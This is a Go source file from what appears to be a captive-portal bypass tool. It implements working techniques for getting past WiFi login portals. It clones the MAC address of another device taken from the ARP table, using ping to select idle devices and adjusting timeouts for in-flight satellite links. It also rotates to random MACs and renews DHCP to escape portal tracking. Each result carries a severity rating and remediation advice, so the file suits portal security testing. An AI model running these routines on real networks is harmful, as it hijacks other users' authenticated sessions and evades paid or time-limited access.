// Copyright (C) 2026 Mikko Parkkola. All rights reserved.
// Licensed under AGPL-3.0. See LICENSE file.

package bypass

import (
	"context"
	"fmt"
	"net"
	"os/exec"
	"strconv"
	"strings"
	"time"

	"github.com/MikkoParkkola/nowifi/internal/platform"
)

// ---------------------------------------------------------------------------
// Techniques 6-7: MAC clone (idle / any)
// ---------------------------------------------------------------------------

// measureNetworkLatency probes the gateway RTT to calibrate timeouts.
// Inflight WiFi (satellite) has 500-2500ms RTT; ground WiFi is typically <50ms.
func measureNetworkLatency(gateway string) time.Duration {
	// Validate gateway IP before passing to exec.Command.
	if ip := net.ParseIP(gateway); ip == nil {
		return 2 * time.Second // Conservative default for invalid gateway.
	}

	var totalMs int64
	var count int64

	for i := 0; i < 3; i++ {
		start := time.Now()
		ctx, cancel := context.WithTimeout(context.Background(), 5*time.Second)
		err := exec.CommandContext(ctx, "ping", "-c", "1", "-W", "5", gateway).Run()
		cancel()
		if err == nil {
			elapsed := time.Since(start)
			totalMs += elapsed.Milliseconds()
			count++
		}
	}

	if count == 0 {
		return 2 * time.Second // Conservative default for unknown networks.
	}

	avgMs := totalMs / count
	// Add 50% margin for jitter.
	return time.Duration(avgMs*3/2) * time.Millisecond
}

// isInflightNetwork returns true if network latency suggests satellite link.
func isInflightNetwork(rtt time.Duration) bool {
	return rtt > 400*time.Millisecond
}

func tryMACClone(iface string, idleOnly bool, plat PlatformOps) Result {
	method := MACClone
	if idleOnly {
		method = MACCloneIdle
	}

	gateway := plat.GetGateway(iface)
	if gateway == "" {
		return Result{Method: method, Success: false, Details: "No gateway"}
	}
	// Validate gateway IP from system output before passing to exec.Command.
	if ip := net.ParseIP(gateway); ip == nil {
		return Result{Method: method, Success: false, Details: "Invalid gateway IP"}
	}

	ourMAC := plat.GetCurrentMAC(iface)
	arpTable := plat.GetArpTable()

	var candidates []platform.ArpEntry
	for _, entry := range arpTable {
		if entry.Interface != iface {
			continue
		}
		if entry.IP == gateway {
			continue
		}
		if strings.HasPrefix(entry.MAC, "ff:ff") || entry.MAC == "(incomplete)" || len(entry.MAC) < 10 {
			continue
		}
		if entry.MAC == ourMAC {
			continue
		}
		candidates = append(candidates, entry)
	}

	if len(candidates) == 0 {
		return Result{Method: method, Success: false, Details: "No devices in ARP table to clone"}
	}

	if idleOnly {
		// Measure network latency to calibrate idle detection.
		// Critical for satellite links (inflight WiFi) where RTT > 500ms.
		rtt := measureNetworkLatency(gateway)
		pingTimeout := "1"
		if isInflightNetwork(rtt) {
			// Satellite link: use RTT-based timeout so active devices respond.
			timeoutSec := int(rtt.Seconds()) + 2
			if timeoutSec > 10 {
				timeoutSec = 10
			}
			pingTimeout = fmt.Sprintf("%d", timeoutSec)
			logStatus("Satellite network detected (RTT %dms) -- adjusting idle detection timeout to %ss", rtt.Milliseconds(), pingTimeout)
		}

		var idle []platform.ArpEntry
		limit := len(candidates)
		if limit > 10 {
			limit = 10
		}
		for _, c := range candidates[:limit] {
			// Validate IP from ARP table before passing to exec.Command.
			if ip := net.ParseIP(c.IP); ip == nil {
				continue
			}
			timeoutDuration := time.Duration(3) * time.Second
			if isInflightNetwork(rtt) {
				timeoutDuration = rtt*2 + 3*time.Second
			}
			ctx, cancel := context.WithTimeout(context.Background(), timeoutDuration)
			err := exec.CommandContext(ctx, "ping", "-c", "1", "-W", pingTimeout, c.IP).Run()
			cancel()
			if err != nil {
				idle = append(idle, c)
			}
		}
		if len(idle) == 0 {
			if isInflightNetwork(rtt) {
				logStatus("No idle devices on satellite network (all %d responded within %dms)", limit, rtt.Milliseconds())
			}
			return Result{Method: method, Success: false, Details: fmt.Sprintf("No idle devices found (timeout: %ss, RTT: %dms)", pingTimeout, rtt.Milliseconds())}
		}
		candidates = idle
	}

	// Try each candidate (up to 5).
	limit := len(candidates)
	if limit > 5 {
		limit = 5
	}
	for _, target := range candidates[:limit] {
		if !plat.SetMAC(iface, target.MAC) {
			continue
		}
		time.Sleep(time.Second)
		plat.RenewDHCP(iface)
		time.Sleep(3 * time.Second)

		if HasInternet() {
			label := "Direct clone."
			if idleOnly {
				label = "Targeted idle device to avoid collision."
			}
			return Result{
				Method:   method,
				Success:  true,
				Severity: "critical",
				Impact: fmt.Sprintf("Full internet by cloning %sdevice MAC %s (%s)%s",
					func() string {
						if idleOnly {
							return "idle "
						}
						return ""
					}(), target.MAC, target.IP,
					func() string {
						// Detect if target uses a randomized (locally-administered) MAC.
						first, _ := strconv.ParseUint(strings.Split(target.MAC, ":")[0], 16, 8)
						if first&0x02 != 0 {
							return " [privacy MAC — all devices on this network use randomized addresses]"
						}
						return ""
					}()),
				Details:     fmt.Sprintf("Portal uses MAC-only auth. %s", label),
				Remediation: "Use 802.1X. Enable client isolation. Bind sessions to MAC+IP+DHCP lease. Detect duplicate MACs.",
			}
		}
	}

	// Restore original MAC.
	plat.SetMAC(iface, ourMAC)
	plat.RenewDHCP(iface)

	return Result{
		Method:  method,
		Success: false,
		Details: fmt.Sprintf("Tried %d MACs, none granted access", limit),
	}
}

// ---------------------------------------------------------------------------
// Technique 14: MAC rotate
// ---------------------------------------------------------------------------

func tryMACRotate(iface string, plat PlatformOps) Result {
	newMAC := plat.GenerateRandomMAC()
	if !plat.SetMAC(iface, newMAC) {
		return Result{Method: MACRotate, Success: false, Details: "Need sudo for MAC change"}
	}

	time.Sleep(time.Second)
	plat.RenewDHCP(iface)
	time.Sleep(3 * time.Second)

	if HasInternet() {
		return Result{
			Method:      MACRotate,
			Success:     true,
			Severity:    "high",
			Impact:      fmt.Sprintf("Internet with fresh MAC %s -- portal auto-approves new devices", newMAC),
			Details:     "No authentication required for new MAC addresses. Infinite sessions by rotating.",
			Remediation: "Require explicit authentication for all new devices. Don't auto-approve.",
		}
	}

	return Result{
		Method:      MACRotate,
		Success:     false,
		Severity:    "medium",
		Details:     fmt.Sprintf("Fresh MAC %s set but portal still requires auth. Use this for quota/time reset AFTER initial auth.", newMAC),
		Remediation: "Portal correctly requires auth for new devices. Time/quota bypass still possible by re-authenticating with new MAC.",
	}
}

// ---------------------------------------------------------------------------
// Technique 15: DHCP rotate
// ---------------------------------------------------------------------------

func tryDHCPRotate(iface string, plat PlatformOps) Result {
	plat.RenewDHCP(iface)
	time.Sleep(3 * time.Second)

	if HasInternet() {
		return Result{
			Method:      DHCPRotate,
			Success:     true,
			Severity:    "medium",
			Impact:      "Internet after DHCP renewal -- portal tracked by IP, not MAC",
			Details:     "DHCP renewal assigned a new IP that bypassed portal state.",
			Remediation: "Track sessions by MAC+IP. Don't rely on IP alone for portal state.",
		}
	}

	return Result{Method: DHCPRotate, Success: false, Details: "DHCP renewal didn't bypass portal"}
}
